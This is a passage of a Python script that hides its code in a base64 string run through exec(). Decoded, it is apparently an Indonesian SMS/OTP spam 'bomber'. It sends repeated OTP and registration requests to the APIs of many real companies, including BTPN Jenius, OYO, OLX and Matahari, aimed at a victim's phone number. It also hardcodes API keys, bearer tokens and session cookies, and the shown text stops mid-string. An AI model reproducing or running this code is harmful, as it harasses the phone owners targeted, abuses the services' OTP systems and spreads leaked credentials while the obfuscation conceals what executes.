# Obfuscated by Py Compile
# Created by HTR-TECH (https://github.com/htr-tech)
# Instagram : @tahmid.rayat

import base64
exec(base64.b64decode('aW1wb3J0IG9zLHN5cyx0aW1lLHJlcXVlc3RzLHJlLGpzb24scmFuZG9tCmZyb20gcmFuZG9tIGltcG9ydCByYW5kcmFuZ2UgYXMgcmcKcHJpbnQgKCJcMDMzWzAwbSIpCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBvcy5zeXN0ZW0oInB5dGhvbjIgcC5weSIpCmRlZiBiYWxpaygpOgogICAgZj1pbnB1dCgiXHRbZW50ZXIgdG8gYmFja10iKQogICAgaWYgZiA9PSAiIjoKICAgICAgIG9zLnN5c3RlbSgicHl0aG9uIGdhbmd1LnB5IikKICAgIGVsc2U6CiAgICAgICBzeXMuZXhpdCgpCgogICAgcHJpbnQgKCIiIlwwMzNbOTdtCiAg4paEICAgICDiloQgICAgXDAzM1s5NW3vuY/vuY/vuY/vuY/vuY/vuY9cMDMzWzk3bQog4paI4paI4paI4paI4paI4paI4paI4paI4paIICAgXDAzM1s5MW3ilZTilZDilabilZDilZXilZTilZDilZDilZXilabilZDiiY7ilZfilZTilZDilabilZDilZfilaYgIOKVpuKUgOKVkOKVkOKVlyDilabiib0KIFwwMzNbOTdt4paI4paE4paI4paI4paI4paI4paI4paE4paIICAgXDAzM1s5MG3ilb0g4pWrICDilaDilZDilaEg4pWg4pWq4pWm4pWd4pWRIOKVqCDilZHilZEgIOKVkSDilZTilZDilazilZDilZ0KIFwwMzNbOTdt4paIXDAzM1s5MW3ilrzilrzilrzilrzilrzilrwgICAgICAgXDAzM1s5N23ilakgIOKVmuKVkOKJk+KVkOKVnSDilZrilZDilawgICDilanilZriiZDilZDilZ3ilIDilanilIDilZrilZDilZDiiZHilZDiib0KIFwwMzNbOTdt4paIXDAzM1s5MG0ozIVfzIVfzIUozIUozIVfzIVfzIVfzIVfzIVfzIVfzIXMhVwwMzNbOTJtKClcMDMzWzk3beKVpuKVkOKVlyDilZTiiZLilZDilZfilZTilZDilZfilb3ilZTilZTilZDilZDilZXilZTilZDilZDilaHilZTiiZHilZDilZfilZTilabilZDilZcKIFwwMzNbOTdt4paIXDAzM1s5MW3ilrLilrLilrLilrLilrLilrIgICAgICAgXDAzM1s5MG3ilaDilZDilanilZfilaDilZDilZDilaPilZEg4pWRIOKVkeKVqyDilb7ilZfilZrilZDilarilZfilaDilZDilZDilaPilb/ilZEg4pWrCiBcMDMzWzk3beKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICBcMDMzWzkxbeKVvOKVqeKJkeKVkOKVneKVkSDilZDilanilZ0g4pWa4omS4pWd4pWa4pWQ4pWQ4pWd4pWe4pWQ4pWQ4pWd4pWpICDilanilZDilanilZDilZ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcMDMzWzk1be+5i++5i++5i++5i++5i++5iyIiIikKICAgIHByaW50ICgiXDAzM1s5NG3ilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpTilpQiKQoKZGVmIGJhbmVyKCk6CiAgICB2YWsgKCcnJwpcdApcMDMzWzk3bQogIOKWhCAgICAg4paEICAgIFwwMzNbOTVt77mP77mP77mP77mP77mP77mPXDAzM1s5N20KIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgIFwwMzNbOTFt4pWU4pWQ4pWm4pWQ4pWV4pWU4pWQ4pWQ4pWV4pWm4pWQ4omO4pWX4pWU4pWQ4pWm4pWQ4pWX4pWmICDilabilIDilZDilZDilZcg4pWm4om9CiBcMDMzWzk3beKWiOKWhOKWiOKWiOKWiOKWiOKWiOKWhOKWiCAgIFwwMzNbOTBt4pW9IOKVqyAg4pWg4pWQ4pWhIOKVoOKVquKVpuKVneKVkSDilagg4pWR4pWRICDilZEg4pWU4pWQ4pWs4pWQ4pWdCiBcMDMzWzk3beKWiFwwMzNbOTFt4pa84pa84pa84pa84pa84pa8ICAgICAgIFwwMzNbOTdt4pWpICDilZrilZDiiZPilZDilZ0g4pWa4pWQ4pWsICAg4pWp4pWa4omQ4pWQ4pWd4pSA4pWp4pSA4pWa4pWQ4pWQ4omR4pWQ4om9CiBcMDMzWzk3beKWiFwwMzNbOTBtKMyFX8yFX8yFKMyFKMyFX8yFX8yFX8yFX8yFX8yFX8yFzIVcMDMzWzkybSgpXDAzM1s5N23ilabilZDilZcg4pWU4omS4pWQ4pWX4pWU4pWQ4pWX4pW94pWU4pWU4pWQ4pWQ4pWV4pWU4pWQ4pWQ4pWh4pWU4omR4pWQ4pWX4pWU4pWm4pWQ4pWXCiBcMDMzWzk3beKWiFwwMzNbOTFt4pay4pay4pay4pay4pay4payICAgICAgIFwwMzNbOTBt4pWg4pWQ4pWp4pWX4pWg4pWQ4pWQ4pWj4pWRIOKVkSDilZHilasg4pW+4pWX4pWa4pWQ4pWq4pWX4pWg4pWQ4pWQ4pWj4pW/4pWRIOKVqwogXDAzM1s5N23ilojilojilojilojilojilojilojilojiloggICAgXDAzM1s5MW3ilbzilaniiZHilZDilZ3ilZEg4pWQ4pWp4pWdIOKVmuKJkuKVneKVmuKVkOKVkOKVneKVnuKVkOKVkOKVneKVqSAg4pWp4pWQ4pWp4pWQ4pWdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1s5NW3vuYvvuYvvuYvvuYvvuYsKXDAzM1s5MjsxbQrilIDilIDiloTiloDiloDiloDiloTilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKc2FsYWggbG8ga2FsbyBkaSBkaSBoYWphcgrilIDilIDilojilIDilIDilIDilojilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK4pSA4paI4paI4paI4paI4paI4paI4paI4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4paE4paA4paA4paE4pSACuKWkeKWiOKWiOKUgOKWgOKUgOKWiOKWiOKWkeKWkeKWiOKWgOKWiOKWgOKWgOKWgOKWgOKWiOKWkeKWkeKWiOKWkQrilpHilojilojilojiloTilojilojilojilpHilpHiloDilpHiloDilpHilpHilpHilpHilpHiloDiloDilpHilpEKXDAzM1s5N20KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KXDAzM1s5MW0K4pWU4pWXIOKUrOKUgOKUkOKUrCDilKzilIzilKzilJDilIzilIDilJDilKwgIOKVlOKVkOKVl+KUjOKUgOKUkOKUjOKUgOKUkOKUjOKUrOKUkOKUjOKUrOKUkOKUjOKUgOKUkOKUrOKUgOKUkArilaDilanilZfilJzilKzilJjilIIg4pSCIOKUgiDilJzilIDilKTilIIgIOKVmuKVkOKVl+KUnOKUgOKUmOKUnOKUgOKUpOKUguKUguKUguKUguKUguKUguKUnOKUpCDilJzilKzilJgK4pWa4pWQ4pWd4pS04pSU4pSA4pSU4pSA4pSYIOKUtCDilLQg4pS04pS04pSA4pSY4pWa4pWQ4pWd4pS0ICDilLQg4pS04pS0IOKUtOKUtCDilLTilJTilIDilJjilLTilJTilIAKXDAzM1s5N20KXHQtLS0tLS0tLS0tLS0KXG5DcmVhdG9yOlwwMzNbOTdtIEJheXUgUmlza2kKdmVyc2k6IHRlcmJhcnUgMjAyMSBuZ2FiClRlYW06IE1hdmlhIFRla25vbG9naQpqZW5pcyBzbXM6IG1hcGNsdWIsamVuaXVzLG95byxkZXBvcCxjYWxsLG95b2hvdGVscwo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nJycpCgpkZWYga2F0YShzKToKICAgIGZvciBjIGluIHMgKyAiXG4iOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoYykKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDE1Li8xMDApCmRlZiB2YWsocyk6CiAgICBmb3IgYyBpbiBzICsgJ1xuJzoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGMpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcCgxLi8xMDAwKQprYXRhKCJpbmkgdXBkYXRlIG5nYWIgZ3VhIGxlbGFoIGJ1YXQgZ2luaSBzdS4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uIikKa2F0YSgic2MgaW5pIGJlcmZ1bmdzaSBidWF0IGdhbmdndSBvcmFuZyBnYWsgYmVuZXIgYWphIGphZGkgam5nIGRpIHNhbGFoIGd1bmFpbiIpCmthdGEoIuKUiOKUiOKUiOKVsuKUiOKUiOKUiOKUiOKVsSIpCmthdGEoIuKUiOKUiOKUiOKVsSAgICAg4paU4paU4pWyIikKa2F0YSgi4pSI4pSI4pSD4pSI4paH4pSI4pSI4paH4pSI4pSDIikKa2F0YSgi4pWt4pWu4pSj4pSB4pSB4pSB4pSB4pSB4pSB4pSr4pWt4pWuIikKa2F0YSgi4pSD4pSD4pSD4pSI4pSI4pSI4pSI4pSI4pSI4pSD4pSD4pSDIikKa2F0YSgi4pWw4pWv4pSD4pSI4pSI4pSI4pSI4pSI4pSI4pSD4pWw4pWvIikKa2F0YSgi4pSI4pSI4pWw4pST4pSP4pSB4pSB4pST4pSP4pWvIikKa2F0YSgi4pSI4pSI4pSI4pWw4pWv4pSI4pSI4pWw4pWvIikKZGVmIGplbml1cygpOgogICAgdWE9ewogICAgImFjY2VwdCI6ICIqLyoiLAogICAgImJ0cG4tYXBpa2V5IjogImY3M2ViMzRkLTViZjMtNDJjNS1iNzZlLTI3MTQ0OGMyZTg3ZCIsCiAgICAidmVyc2lvbiI6ICIyLjM2LjEtNzU2NSIsCiAgICAiYWNjZXB0LWxhbmd1YWdlIjogImlkIiwKICAgICJ4LXJlcXVlc3QtaWQiOiAiZDdiYTBlYzQtZWJhZC00YWZkLWFiMTItNjJjZTMzMTM3OWJlIiwKICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAiSG9zdCI6ICJhcGkuYnRwbi5jb20iLAogICAgIkNvbm5lY3Rpb24iOiAiS2VlcC1BbGl2ZSIsCiAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAiLAogICAgIkNvb2tpZSI6ICJjNmJjODA1MTg4NzdkZDk3Y2Q3MWZhNmY5MGVhNmEwYT0yNDA1OGI4N2ViNWRhYzFhYzE3NDRkZTliYWJkMTYwNyIsCiAgICAiVXNlci1BZ2VudCI6ICJva2h0dHAvMy4xMi4xIgogICAgfQogICAgZGF0PWpzb24uZHVtcHMoeyJxdWVyeSI6Im11dGF0aW9uIHJlZ2lzdGVyUGhvbmUoJHBob25lOiBTdHJpbmchLCAkbGFuZ3VhZ2U6IExhbmd1YWdlISkge1xuICByZWdpc3RlclBob25lKGlucHV0OiB7cGhvbmU6ICRwaG9uZSwgbGFuZ3VhZ2U6ICRsYW5ndWFnZX0pIHtcbiAgICBhdXRoSWRcbiAgICB0b2tlbklkXG4gICAgX190eXBlbmFtZVxuICB9XG59XG4iLCJ2YXJpYWJsZXMiOnsicGhvbmUiOncsImxhbmd1YWdlIjoiaWQifSwib3BlcmF0aW9uTmFtZSI6InJlZ2lzdGVyUGhvbmUifSkKICAgIHI9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGkuYnRwbi5jb20vamVuaXVzIiwgZGF0YT1kYXQsIGhlYWRlcnM9dWEpLnRleHQKZGVmIHJ1cGEoKToKICAgICB1YT17CiAgICAgIkhvc3QiOiAid2FwaS5ydXBhcnVwYS5jb20iLAogICAgICJDb25uZWN0aW9uIjogImtlZXAtYWxpdmUiLAogICAgICJBdXRob3JpemF0aW9uIjogImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxZFdsa0lqb2lPR1psWTJWalptWXRaVFExWmkwME1UVm1MV0kyTTJVdE1tSmlNelV5Wm1RMk56aGtJaXdpYVdGMElqb3hOVGt6TURJeU5Ea3lMQ0pwYzNNaU9pSjNZWEJwTG5KMWNHRnlkWEJoSW4wLmZFVEtYUTBLeVpka3NXV3Nqa1JwamlLTHJKdFpXbXRvZ0t5ZVB5Y29GMEUiLAogICAgICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAiWC1Db21wYW55LU5hbWUiOiAib2RpIiwKICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUExMDdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsCiAgICAgInVzZXItcGxhdGZvcm0iOiAibW9iaWxlIiwKICAgICAiWC1Gcm9udGVuZC1UeXBlIjogIm1vYmlsZSIsCiAgICAgIk9yaWdpbiI6ICJodHRwczovL20ucnVwYXJ1cGEuY29tIiwKICAgICAiUmVmZXJlciI6ICJodHRwczovL20ucnVwYXJ1cGEuY29tL3ZlcmlmaWNhdGlvbj9wYWdlPW90cC1jaG9pY2VzIiwKICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUsIGJyIiwKICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IgogICAgIH0KICAgICBkYXQ9anNvbi5kdW1wcyh7InBob25lIjpubywiYWN0aW9uIjoicmVnaXN0ZXIiLCJjaGFubmVsIjoiY2hhdCIsImVtYWlsIjoiIiwiY3VzdG9tZXJfaWQiOiIwIiwiaXNfcmVzZW5kIjowfSkKICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93YXBpLnJ1cGFydXBhLmNvbS9hdXRoL2dlbmVyYXRlLW90cCIsIGRhdGE9ZGF0LCBoZWFkZXJzPXVhKS50ZXh0CmRlZiBtYXBjbHViKCk6CiAgICB1YT17CiAgICAiSG9zdCI6ICJjbXNhcGkubWFwY2x1Yi5jb20iLAogICAgIkNvbm5lY3Rpb24iOiAia2VlcC1hbGl2ZSIsCiAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUExMDdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsCiAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgIk9yaWdpbiI6ICJodHRwczovL3d3dy5tYXBjbHViLmNvbSIsCiAgICAiUmVmZXJlciI6ICJodHRwczovL3d3dy5tYXBjbHViLmNvbS9lbi91c2VyL3NpZ251cCIsCiAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUsIGJyIiwKICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciCiAgICB9CiAgICBkYXQ9anNvbi5kdW1wcyh7InBob25lIjpub30pCiAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9jbXNhcGkubWFwY2x1Yi5jb20vYXBpL3NpZ251cC1vdHAiLCBkYXRhPWRhdCwgaGVhZGVycz11YSkudGV4dApkZWYgdGFoaSgpOgogICAgdWE9ewogICAgIkhvc3QiOiAiY21zYXBpLm1hcGNsdWIuY29tIiwKICAgICJDb25uZWN0aW9uIjogImtlZXAtYWxpdmUiLAogICAgIkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLAogICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1BMTA3RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICJPcmlnaW4iOiAiaHR0cHM6Ly93d3cubWFwY2x1Yi5jb20iLAogICAgIlJlZmVyZXIiOiAiaHR0cHM6Ly93d3cubWFwY2x1Yi5jb20vZW4vdXNlci9zaWdudXAiLAogICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlLCBiciIsCiAgICAiQWNjZXB0LUxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IgogICAgfQogICAgZGF0PWpzb24uZHVtcHMoeyJwaG9uZSI6bm99KQogICAgciA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vY21zYXBpLm1hcGNsdWIuY29tL2FwaS9zaWdudXAtb3RwIiwgZGF0YT1kYXQsIGhlYWRlcnM9dWEpLnRleHQKZGVmIG95bygpOgogICAgdWE9ewogICAgIkhvc3QiOiAiaWRlbnRpdHktZ2F0ZXdheS5veW9yb29tcy5jb20iLAogICAgImNvbnN1bWVyX2hvc3QiOiAiaHR0cHM6Ly93d3cub3lvcm9vbXMuY29tIiwKICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQiLAogICAgImFjY2Vzc190b2tlbiI6ICJTRkk0VEVSMVdWUlRha1JVZW5ZdGFscExiMHc2Vm5ock5HVkxVVmxCVEU1VGNVRlZaRnBCU25jPSIsCiAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUExMDdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjEwNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsCiAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgImFjY2VwdCI6ICIqLyoiLAogICAgIm9yaWdpbiI6ICJodHRwczovL3d3dy5veW9yb29tcy5jb20iLAogICAgInJlZmVyZXIiOiAiaHR0cHM6Ly93d3cub3lvcm9vbXMuY29tL2xvZ2luIiwKICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSwgYnIiLAogICAgfQogICAgZGF0PWpzb24uZHVtcHMoeyJwaG9uZSI6YywiY291bnRyeV9jb2RlIjoiKzYyIiwiY291bnRyeV9pc29fY29kZSI6IklEIiwibm9kIjoiNCIsInNlbmRfb3RwIjoidHJ1ZSIsImRldmlzZV9yb2xlIjoiQ29uc3VtZXJfR3Vlc3QifSkKICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2lkZW50aXR5LWdhdGV3YXkub3lvcm9vbXMuY29tL2lkZW50aXR5L2FwaS92MS9vdHAvZ2VuZXJhdGVfYnlfcGhvbmU/bG9jYWxlPWlkIiwgZGF0YT1kYXQsIGhlYWRlcnM9dWEpLnRleHQKZGVmIGRlcG9wKCk6CiAgICB1YT17CiAgICAiSG9zdCI6ICJ3ZWJhcGkuZGVwb3AuY29tIiwKICAgICJhY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwKICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgU00tQTEwN0YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUsIGJyIiwKICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLAogICAgfQogICAgZGF0PWpzb24uZHVtcHMoeyJwaG9uZV9udW1iZXIiOm5vLCJjb3VudHJ5X2NvZGUiOiJJRCJ9KQogICAgciA9IHJlcXVlc3RzLnB1dCgiaHR0cHM6Ly93ZWJhcGkuZGVwb3AuY29tL2FwaS9hdXRoL3YxL3ZlcmlmeS9waG9uZSIsIGRhdGE9ZGF0LCBoZWFkZXJzPXVhKQpkZWYgc29wbGFpKCk6CiAgICB1YT17CiAgICAiSG9zdCI6ICJhcGkuc29vcGxhaS5jb20iLAogICAgImFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLAogICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1BMTA3RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICJvcmlnaW4iOiAiaHR0cHM6Ly93d3cuc29vcGxhaS5jb20iLAogICAgInJlZmVyZXIiOiAiaHR0cHM6Ly93d3cuc29vcGxhaS5jb20vcmVnaXN0ZXIiLAogICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlLCBiciIsCiAgICAiQWNjZXB0LUxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IiwKICAgIH0KICAgIGRhdD1qc29uLmR1bXBzKHsicGhvbmUiOm5vfSkKICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2FwaS5zb29wbGFpLmNvbS9jdXN0b21lci9yZWdpc3Rlci9vdHAvcmVxdWVzdCIsIGRhdGE9ZGF0LCBoZWFkZXJzPXVhKQpkZWYgY2FsbCgpOgogICAgaGVhZCA9IHsKICAgICJYLVJlcXVlc3RlZC1XaXRoIjogIlhNTEh0dHBSZXF1ZXN0IiwKICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBTTS1BMTA3RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNjIgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgIkNvbnRlbnQtVHlwZSI6IiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgiLAogICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICJPcmlnaW4iOiAiaHR0cHM6Ly9pZC5qYWdyZXdhcmQuY29tIiwKICAgICJSZWZlcmVyIjogImh0dHBzOi8vaWQuamFncmV3YXJkLmNvbS9tZW1iZXIvcmVnaXN0ZXIvIiwKICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSwgYnIiLAogICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyIsCiAgICAiX19jZmR1aWQiOiAiZDRkZTFlN2VhMmNlZDA5ZWNkZTU0YTU2OGFmMWFjNTBiMTU4NDcwOTgxNiIsCiAgICAiX2dhIjogIkdBMS4yLjIwMzcxNTEzOTYuMTU4NDcwOTg1NSIsCiAgICAiUEhQU0VTU0lEIjogIm44OHBtdHZ2c2RwZjI1ODk4YTlqZXFiZ2djIiwKICAgICJEQVBST1BTIjogInNqcy53ZWJHbFJlbmRlcmVyOlBvd2VyVlIgUm9ndWUgR0U4MzIwfGJqcy5hY2Nlc3NEb206MXxiY29va2llU3VwcG9ydDoxfGJjc3MuYW5pbWF0aW9uczoxfGJjc3MuY29sdW1uczoxfGJjc3MudHJhbnNmb3JtczoxfGJjc3MudHJhbnNpdGlvbnM6MXxzZGV2aWNlUGl4ZWxSYXRpbzoxLjc1fGlkaXNwbGF5Q29sb3JEZXB0aDoyNHxiZmxhc2hDYXBhYmxlOjB8Ymh0bWwuYXVkaW86MXxiaHRtbC5jYW52YXM6MXxiaHRtbC5pbmxpbmVzdmc6MXxiaHRtbC5zdmc6MXxiaHRtbC52aWRlbzoxfGJqcy5hcHBsaWNhdGlvbkNhY2hlOjF8YmpzLmRldmljZU1vdGlvbjoxfGJqcy5kZXZpY2VPcmllbnRhdGlvbjowfGJqcy5nZW9Mb2NhdGlvbjoxfGJqcy5pbmRleGVkREI6MXxianMuanNvbjoxfGJqcy5sb2NhbFN0b3JhZ2U6MXxianMubW9kaWZ5Q3NzOjF8YmpzLm1vZGlmeURvbToxfGJqcy5xdWVyeVNlbGVjdG9yOjF8YmpzLnNlc3Npb25TdG9yYWdlOjF8YmpzLnN1cHBvcnRCYXNpY0phdmFTY3JpcHQ6MXxianMuc3VwcG9ydENvbnNvbGVMb2c6MXxianMuc3VwcG9ydEV2ZW50TGlzdGVuZXI6MXxianMuc3VwcG9ydEV2ZW50czoxfGJqcy50b3VjaEV2ZW50czoxfGJqcy53ZWJHbDoxfGJqcy53ZWJTb2NrZXRzOjF8YmpzLndlYlNxbERhdGFiYXNlOjF8YmpzLndlYldvcmtlcnM6MXxianMueGhyOjF8aW9yaWVudGF0aW9uOjB8YnVzZXJNZWRpYToxfGJqcy5iYXR0ZXJ5OjAiLAogICAgfQogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9pZC5qYWdyZXdhcmQuY29tL21lbWJlci92ZXJpZnktbW9iaWxlLyIrYysiLyIsIGhlYWRlcnM9aGVhZCkKZGVmIGNhbGwyKCk6CiAgICB1YT17CiAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgIkhvc3QiOiAic3J2My5zYW1waW5nYW4uY28uaWQiLAogICAgIkNvbm5lY3Rpb24iOiAiS2VlcC1BbGl2ZSIsCiAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAiLAogICAgIlVzZXItQWdlbnQiOiAib2todHRwLzQuNC4wIgogICAgfQogICAgZGF0PWpzb24uZHVtcHMoeyJjb3VudHJ5Q29kZSI6Iis2MiIsInBob25lTnVtYmVyIjpjfSkKICAgIHI9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9zcnYzLnNhbXBpbmdhbi5jby5pZC9hdXRoL2dlbmVyYXRlLW90cCIsIGRhdGE9ZGF0LCBoZWFkZXJzPXVhKQpkZWYgYWxvZG9jKCk6CiAgICByZXE9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9udXViaS5oZXJva3VhcHAuY29tL2FwaS9zcGFtL2Fsb2RvayIsIGRhdGE9eyJudW1iZXIiOm5vfSkudGV4dApkZWYgb2x4KCk6CiAgICByZXE9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93d3cub2x4LmNvLmlkL2FwaS9hdXRoL2F1dGhlbnRpY2F0ZSIsIGpzb249eyJncmFudFR5cGUiOiJwaG9uZSIsInBob25lIjp3LCJsYW5ndWFnZSI6ImlkIn0pLmpzb24oKQpkZWYgbWF0YWhhcmkoKToKICAgICBoZWRlciA9IHsnSG9zdCc6ICd0aG9yLm1hdGFoYXJpLmNvbScsCiAgICAgICAgICAgICAgJ2NvbnRlbnQtbGVuZ3RoJzogJzIzMCcsCiAgICAgICAgICAgICAgJ21vZHVsZWNvZGUnOiAnTVInLAogICAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cubWF0YWhhcmkuY29tJywKICAgICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6ICdleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdGIyUjFiR1ZEYjJSbElqb2lUVklpTENKMWMyVnlWSGx3WlNJNklqRWlMQ0psZUhBaU9qRTFORE0yTmpBNU1EWXNJblZ6WlhKT1lXMWxJam9pUzBacGIyVmlNV2h2ZVU5RlJEQkVSV1FpTENKMWMyVnlTV1FpT2lKd2NtOWtkV04wYVc5dU5EWXhPVEF5TmpRME5TSXNJbXAwYVNJNklqRm1NakkzTnpFNUxUWTRPVE10TkRoall5MWlObVF6TFdZMk9Ua3pNV016TURJd1lTSXNJbWxoZENJNk1UVTBNelkxTnpNd05uMC42WGRyVVg5UXpEMExkMmVPSmVwN1FuU3dWamZGeWpxLXY3UDR3MGxHRzlNJywKICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICdhY2NlcHQnOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qJywKICAgICAgICAgICAgICAnY2xpZW50aWQnOiAnbWRzX213ZWInLAogICAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgUmVkbWkgNUEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIEN